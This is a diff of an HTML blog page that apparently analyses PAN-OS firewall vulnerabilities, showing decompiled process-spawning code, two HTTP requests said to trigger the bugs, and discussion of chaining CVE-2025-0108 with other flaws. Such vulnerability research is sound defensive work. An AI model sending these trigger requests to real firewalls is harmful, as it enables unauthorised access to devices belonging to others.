-          </span><span class="err">pthread_mutex_lock((pthread_mutex_t</span><span class="w"> </span><span class="err">*)&amp;DAT_</span><span class="mi">009</span><span class="err">ea</span><span class="mi">140</span><span class="err">);</span><span class="w">
-          </span><span class="err">//</span><span class="w"> </span><span class="err">将进程添加到进程列表中</span><span class="w">
-          </span><span class="err">*(FILE</span><span class="w"> </span><span class="err">**)pFVar</span><span class="mi">3</span><span class="w"> </span><span class="err">=</span><span class="w"> </span><span class="err">DAT_</span><span class="mi">009</span><span class="err">ea</span><span class="mi">120</span><span class="err">;</span><span class="w">
-          </span><span class="err">DAT_</span><span class="mi">009</span><span class="err">ea</span><span class="mi">120</span><span class="w"> </span><span class="err">=</span><span class="w"> </span><span class="err">pFVar</span><span class="mi">3</span><span class="err">;</span><span class="w">
-          </span><span class="err">pthread_mutex_unlock((pthread_mutex_t</span><span class="w"> </span><span class="err">*)&amp;DAT_</span><span class="mi">009</span><span class="err">ea</span><span class="mi">140</span><span class="err">);</span><span class="w">
-          </span><span class="err">goto</span><span class="w"> </span><span class="err">LAB_</span><span class="mi">005</span><span class="err">c</span><span class="mi">4430</span><span class="err">;</span><span class="w">
-        </span><span class="p">}</span><span class="w">
-        </span><span class="err">fclose(local_</span><span class="mi">30</span><span class="err">);</span><span class="w">
-      </span><span class="p">}</span><span class="w">
-    </span><span class="p">}</span><span class="w">
-    </span><span class="err">free(pFVar</span><span class="mi">3</span><span class="err">);</span><span class="w">
-    </span><span class="err">local_</span><span class="mi">30</span><span class="w"> </span><span class="err">=</span><span class="w"> </span><span class="err">(FILE</span><span class="w"> </span><span class="err">*)</span><span class="mi">0</span><span class="err">x</span><span class="mi">0</span><span class="err">;</span><span class="w">
-  </span><span class="p">}</span><span class="w">
-</span><span class="err">LAB_</span><span class="mi">005</span><span class="err">c</span><span class="mi">4430</span><span class="err">:</span><span class="w">
-  </span><span class="err">//</span><span class="w"> </span><span class="err">栈保护检查</span><span class="w">
-  </span><span class="err">if</span><span class="w"> </span><span class="err">(local_</span><span class="mi">20</span><span class="w"> </span><span class="err">!=</span><span class="w"> </span><span class="err">*(long</span><span class="w"> </span><span class="err">*)(in_FS_OFFSET</span><span class="w"> </span><span class="err">+</span><span class="w"> </span><span class="mi">0</span><span class="err">x</span><span class="mi">28</span><span class="err">))</span><span class="w"> </span><span class="p">{</span><span class="w">
-    </span><span class="err">__stack_chk_fail();</span><span class="w">
-  </span><span class="p">}</span><span class="w">
-  </span><span class="err">return</span><span class="w"> </span><span class="err">local_</span><span class="mi">30</span><span class="err">;</span><span class="w">
-</span><span class="p">}</span><span class="w">
-</span></pre></td></tr></tbody></table></code></div></div>
+  <span class="c1">// 栈保护初始化</span>
+  <span class="n">local_20</span> <span class="o">=</span> <span class="o">*</span><span class="p">(</span><span class="kt">long</span> <span class="o">*</span><span class="p">)(</span><span class="n">in_FS_OFFSET</span> <span class="o">+</span> <span class="mh">0x28</span><span class="p">);</span>
+  <span class="c1">// 分配一个FILE结构体用于管理子进程</span>
+  <span class="n">pFVar3</span> <span class="o">=</span> <span class="p">(</span><span class="kt">FILE</span> <span class="o">*</span><span class="p">)</span><span class="n">malloc</span><span class="p">(</span><span class="mh">0x18</span><span class="p">);</span>
+  <span class="n">local_30</span> <span class="o">=</span> <span class="n">pFVar3</span><span class="p">;</span>
+  <span class="k">if</span> <span class="p">(</span><span class="n">pFVar3</span> <span class="o">!=</span> <span class="p">(</span><span class="kt">FILE</span> <span class="o">*</span><span class="p">)</span><span class="mh">0x0</span><span class="p">)</span> <span class="p">{</span>
+    <span class="c1">// 创建管道</span>
+    <span class="n">iVar1</span> <span class="o">=</span> <span class="n">pipe</span><span class="p">(</span><span class="o">&amp;</span><span class="n">local_28</span><span class="p">);</span>
+    <span class="k">if</span> <span class="p">(</span><span class="n">iVar1</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+      <span class="c1">// 将管道读取端转换为FILE流</span>
+      <span class="n">local_30</span> <span class="o">=</span> <span class="n">fdopen</span><span class="p">(</span><span class="n">local_28</span><span class="p">,</span><span class="s">"r"</span><span class="p">);</span>
+      <span class="k">if</span> <span class="p">(</span><span class="n">local_30</span> <span class="o">==</span> <span class="p">(</span><span class="kt">FILE</span> <span class="o">*</span><span class="p">)</span><span class="mh">0x0</span><span class="p">)</span> <span class="p">{</span>
+        <span class="c1">// 如果转换失败，关闭管道的两端</span>
+        <span class="n">close</span><span class="p">(</span><span class="n">local_28</span><span class="p">);</span>
+        <span class="n">close</span><span class="p">(</span><span class="n">local_24</span><span class="p">);</span>
+      <span class="p">}</span>
+      <span class="k">else</span> <span class="p">{</span>
+        <span class="c1">// 锁定互斥锁避免竞态条件</span>
+        <span class="n">pthread_mutex_lock</span><span class="p">((</span><span class="n">pthread_mutex_t</span> <span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">DAT_009ea140</span><span class="p">);</span>
+        <span class="c1">// 创建子进程</span>
+        <span class="n">_Var2</span> <span class="o">=</span> <span class="n">vfork</span><span class="p">();</span>
+        <span class="k">if</span> <span class="p">(</span><span class="n">_Var2</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+          <span class="c1">// 这是子进程代码</span>
+          <span class="c1">// 关闭管道读取端</span>
+          <span class="n">close</span><span class="p">(</span><span class="n">local_28</span><span class="p">);</span>
+          <span class="n">pFVar3</span> <span class="o">=</span> <span class="n">DAT_009ea120</span><span class="p">;</span>
+          <span class="k">if</span> <span class="p">(</span><span class="n">local_24</span> <span class="o">!=</span> <span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
+            <span class="c1">// 将管道写入端复制到标准输出</span>
+            <span class="n">dup2</span><span class="p">(</span><span class="n">local_24</span><span class="p">,</span><span class="mi">1</span><span class="p">);</span>
+            <span class="n">close</span><span class="p">(</span><span class="n">local_24</span><span class="p">);</span>
+            <span class="n">pFVar3</span> <span class="o">=</span> <span class="n">DAT_009ea120</span><span class="p">;</span>
+          <span class="p">}</span>
+          <span class="c1">// 关闭所有打开的文件描述符</span>
+          <span class="k">for</span> <span class="p">(;</span> <span class="n">pFVar3</span> <span class="o">!=</span> <span class="p">(</span><span class="kt">FILE</span> <span class="o">*</span><span class="p">)</span><span class="mh">0x0</span><span class="p">;</span> <span class="n">pFVar3</span> <span class="o">=</span> <span class="o">*</span><span class="p">(</span><span class="kt">FILE</span> <span class="o">**</span><span class="p">)</span><span class="n">pFVar3</span><span class="p">)</span> <span class="p">{</span>
+            <span class="n">iVar1</span> <span class="o">=</span> <span class="n">fileno</span><span class="p">((</span><span class="kt">FILE</span> <span class="o">*</span><span class="p">)</span><span class="n">pFVar3</span><span class="o">-&gt;</span><span class="n">_IO_read_ptr</span><span class="p">);</span>
+            <span class="n">close</span><span class="p">(</span><span class="n">iVar1</span><span class="p">);</span>
+          <span class="p">}</span>
+          <span class="c1">// 执行指定的命令 - 这里是执行命令的关键部分</span>
+          <span class="n">execv</span><span class="p">(</span><span class="n">param_1</span><span class="p">,</span><span class="n">param_2</span><span class="p">);</span>
+          <span class="c1">// 如果execv返回，表示出错</span>
+          <span class="n">_exit</span><span class="p">(</span><span class="mh">0x7f</span><span class="p">);</span>
+        <span class="p">}</span>
+        <span class="c1">// 父进程继续执行</span>
+        <span class="n">pthread_mutex_unlock</span><span class="p">((</span><span class="n">pthread_mutex_t</span> <span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">DAT_009ea140</span><span class="p">);</span>
+        <span class="c1">// 关闭管道写入端</span>
+        <span class="n">close</span><span class="p">(</span><span class="n">local_24</span><span class="p">);</span>
+        <span class="k">if</span> <span class="p">(</span><span class="mi">0</span> <span class="o">&lt;</span> <span class="n">_Var2</span><span class="p">)</span> <span class="p">{</span>
+          <span class="c1">// 保存子进程的信息</span>
+          <span class="o">*</span><span class="p">(</span><span class="n">__pid_t</span> <span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">pFVar3</span><span class="o">-&gt;</span><span class="n">_IO_read_end</span> <span class="o">=</span> <span class="n">_Var2</span><span class="p">;</span>
+          <span class="n">pFVar3</span><span class="o">-&gt;</span><span class="n">_IO_read_ptr</span> <span class="o">=</span> <span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="n">local_30</span><span class="p">;</span>
+          <span class="n">pthread_mutex_lock</span><span class="p">((</span><span class="n">pthread_mutex_t</span> <span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">DAT_009ea140</span><span class="p">);</span>
+          <span class="c1">// 将进程添加到进程列表中</span>
+          <span class="o">*</span><span class="p">(</span><span class="kt">FILE</span> <span class="o">**</span><span class="p">)</span><span class="n">pFVar3</span> <span class="o">=</span> <span class="n">DAT_009ea120</span><span class="p">;</span>
+          <span class="n">DAT_009ea120</span> <span class="o">=</span> <span class="n">pFVar3</span><span class="p">;</span>
+          <span class="n">pthread_mutex_unlock</span><span class="p">((</span><span class="n">pthread_mutex_t</span> <span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">DAT_009ea140</span><span class="p">);</span>
+          <span class="k">goto</span> <span class="n">LAB_005c4430</span><span class="p">;</span>
+        <span class="p">}</span>
+        <span class="n">fclose</span><span class="p">(</span><span class="n">local_30</span><span class="p">);</span>
+      <span class="p">}</span>
+    <span class="p">}</span>
+    <span class="n">free</span><span class="p">(</span><span class="n">pFVar3</span><span class="p">);</span>
+    <span class="n">local_30</span> <span class="o">=</span> <span class="p">(</span><span class="kt">FILE</span> <span class="o">*</span><span class="p">)</span><span class="mh">0x0</span><span class="p">;</span>
+  <span class="p">}</span>
+<span class="n">LAB_005c4430</span><span class="o">:</span>
+  <span class="c1">// 栈保护检查</span>
+  <span class="k">if</span> <span class="p">(</span><span class="n">local_20</span> <span class="o">!=</span> <span class="o">*</span><span class="p">(</span><span class="kt">long</span> <span class="o">*</span><span class="p">)(</span><span class="n">in_FS_OFFSET</span> <span class="o">+</span> <span class="mh">0x28</span><span class="p">))</span> <span class="p">{</span>
+    <span class="n">__stack_chk_fail</span><span class="p">();</span>
+  <span class="p">}</span>
+  <span class="k">return</span> <span class="n">local_30</span><span class="p">;</span>
+<span class="p">}</span>
+</pre></td></tr></tbody></table></code></div></div>
 
 <p>With the payload’s execution point in mind, let’s go back and look at how the exploit was triggered. We ended up locating the PA’s <code class="language-plaintext highlighter-rouge">show chassis-ready</code> command (and some other commands as well), which is used to display the hardware status of the device, including whether the dataplane is ready to handle traffic and whether the running policy is loaded. When this command is executed</p>
 
@@ -2710,17 +2710,17 @@ Content-Length: 99
 
 <p>For example, the following request could trigger this vulnerability:</p>
 
-<div class="language-json highlighter-rouge"><div class="code-header">
-        <span data-label-text="JSON"><i class="fas fa-code fa-fw small"></i></span>
+<div class="language-http highlighter-rouge"><div class="code-header">
+        <span data-label-text="Http"><i class="fas fa-code fa-fw small"></i></span>
       <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
 2
 3
 4
-</pre></td><td class="rouge-code"><pre><span class="err">GET</span><span class="w"> </span><span class="err">/php/device/export.file.php?type=techsupport</span><span class="w"> </span><span class="err">HTTP/</span><span class="mf">1.1</span><span class="w">
-</span><span class="err">Host:</span><span class="w"> </span><span class="mf">192.168</span><span class="err">.</span><span class="mf">32.251</span><span class="w">
-</span><span class="err">cookie:</span><span class="w"> </span><span class="err">PHPSESSID=</span><span class="mi">9</span><span class="err">f</span><span class="mi">56</span><span class="err">ts</span><span class="mi">27</span><span class="err">jh</span><span class="mi">56</span><span class="err">hh</span><span class="mi">8</span><span class="err">pgrl</span><span class="mi">3</span><span class="err">nhkmkq;</span><span class="w">
+</pre></td><td class="rouge-code"><pre><span class="nf">GET</span> <span class="nn">/php/device/export.file.php?type=techsupport</span> <span class="k">HTTP</span><span class="o">/</span><span class="m">1.1</span>
+<span class="na">Host</span><span class="p">:</span> <span class="s">192.168.32.251</span>
+<span class="na">cookie</span><span class="p">:</span> <span class="s">PHPSESSID=9f56ts27jh56hh8pgrl3nhkmkq;</span>
 
-</span></pre></td></tr></tbody></table></code></div></div>
+</pre></td></tr></tbody></table></code></div></div>
 
 <p><a href="/assets/img/20250424/image16.png" class="popup img-link  shimmer"><img src="/assets/img/20250424/image16.png" alt="image.png" loading="lazy"></a></p>
 
@@ -2730,17 +2730,17 @@ Content-Length: 99
 
 <p>For example, the following request could trigger the vulnerability:</p>
 
-<div class="language-json highlighter-rouge"><div class="code-header">
-        <span data-label-text="JSON"><i class="fas fa-code fa-fw small"></i></span>
+<div class="language-http highlighter-rouge"><div class="code-header">
+        <span data-label-text="Http"><i class="fas fa-code fa-fw small"></i></span>
       <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
 2
 3
 4
-</pre></td><td class="rouge-code"><pre><span class="err">GET</span><span class="w"> </span><span class="err">/unauth/php/change_password.php</span><span class="w"> </span><span class="err">HTTP/</span><span class="mf">1.1</span><span class="w">
-</span><span class="err">Host:</span><span class="w"> </span><span class="mf">192.168</span><span class="err">.</span><span class="mf">32.251</span><span class="w">
-</span><span class="err">cookie:</span><span class="w"> </span><span class="err">PHPSESSID=</span><span class="mi">9</span><span class="err">f</span><span class="mi">56</span><span class="err">ts</span><span class="mi">27</span><span class="err">jh</span><span class="mi">56</span><span class="err">hh</span><span class="mi">8</span><span class="err">pgrl</span><span class="mi">3</span><span class="err">nhkmkq;</span><span class="w">
+</pre></td><td class="rouge-code"><pre><span class="nf">GET</span> <span class="nn">/unauth/php/change_password.php</span> <span class="k">HTTP</span><span class="o">/</span><span class="m">1.1</span>
+<span class="na">Host</span><span class="p">:</span> <span class="s">192.168.32.251</span>
+<span class="na">cookie</span><span class="p">:</span> <span class="s">PHPSESSID=9f56ts27jh56hh8pgrl3nhkmkq;</span>
 
-</span></pre></td></tr></tbody></table></code></div></div>
+</pre></td></tr></tbody></table></code></div></div>
 
 <p><a href="/assets/img/20250424/image18.png" class="popup img-link  shimmer"><img src="/assets/img/20250424/image18.png" alt="image.png" loading="lazy"></a></p>
 
@@ -2754,7 +2754,7 @@ Content-Length: 99
 
 <p>The previous analysis did not describe panCreateRemoteAppwebSession too much, in fact, this function is mainly used to create a session, which is also the key to be able to write payloads.</p>
 
-<p>The definition of <code class="language-plaintext highlighter-rouge">panCreateRemoteAppwebSession</code> cannot be found in the PHP source code, the function is actually defined in the <a href="http://panhttpdmodule.so/">panhttpdmodule.so</a> module.</p>
+<p>The definition of <code class="language-plaintext highlighter-rouge">panCreateRemoteAppwebSession</code> cannot be found in the PHP source code, the function is actually defined in the <code class="language-plaintext highlighter-rouge">panhttpdmodule.so</code> module.</p>
 
 <p><a href="/assets/img/20250424/image20.png" class="popup img-link  shimmer"><img src="/assets/img/20250424/image20.png" alt="image.png" loading="lazy"></a></p>
 
@@ -2762,13 +2762,13 @@ Content-Length: 99
 
 <p>Due to space constraints and the fact that there are many excellent articles analyzing CVE-2025-0108, I will not go into the details here. I won’t go into too much detail here. X-Forwarded-For is set in proxy_default.conf.</p>
 
-<p>When a client request arrives at Nginx, Nginx checks to see if the request contains the X-Forwarded-For header. If the request already contains this header, $proxy_add_x_forwarded_for appends the client’s actual IP address to the existing value in the format: original X-Forwarded-For value, $remote_addr. If the request does not contain the X-Forwarded-For header, the $proxy_add_x_forwarded_for value is appended to the existing value. x_forwarded_for value will be directly equal to $remote_addr (the client’s IP address).</p>
+<p>When a client request arrives at Nginx, Nginx checks to see if the request contains the X-Forwarded-For header. If the request already contains this header, <code class="language-plaintext highlighter-rouge">$proxy_add_x_forwarded_for</code> appends the client’s actual IP address to the existing value in the format: original X-Forwarded-For value, <code class="language-plaintext highlighter-rouge">$remote_addr</code>. If the request does not contain the X-Forwarded-For header, the $proxy_add_x_forwarded_for value is appended to the existing value. x_forwarded_for value will be directly equal to <code class="language-plaintext highlighter-rouge">$remote_addr</code> (the client’s IP address).</p>
 
 <p><a href="/assets/img/20250424/image21.png" class="popup img-link  shimmer"><img src="/assets/img/20250424/image21.png" alt="image.png" loading="lazy"></a></p>
 
 <p><a href="/assets/img/20250424/image22.png" class="popup img-link  shimmer"><img src="/assets/img/20250424/image22.png" alt="image.png" loading="lazy"></a></p>
 
-<p>However, in a real-world environment, we found that the checking mechanism in the panCreateRemoteAppwebSession function is strictly dependent on the integrity of the X-Forwarded-For header. Even if we were able to achieve authentication bypass via CVE-2025-0108, due to Nginx’s strict header handling and forwarding mechanism, it is difficult to directly manipulate the internal service to think that the request is coming from 127.0.0.1. This makes it still difficult to directly combine the two vulnerabilities for exploitation.</p>
+<p>However, in a real-world environment, we found that the checking mechanism in the <code class="language-plaintext highlighter-rouge">panCreateRemoteAppwebSession</code> function is strictly dependent on the integrity of the X-Forwarded-For header. Even if we were able to achieve authentication bypass via CVE-2025-0108, due to Nginx’s strict header handling and forwarding mechanism, it is difficult to directly manipulate the internal service to think that the request is coming from 127.0.0.1. This makes it still difficult to directly combine the two vulnerabilities for exploitation.</p>
 
 <p>However, in a bulletin about CVE-2025-0108, Palo Alto noted that “Palo Alto Networks discovered that attackers are attempting to chain CVE-2025-0108, CVE-2024-9474, and CVE-2025-0111, targeting unpatched and unprotected PAN-OS Web management interface.”</p>
 
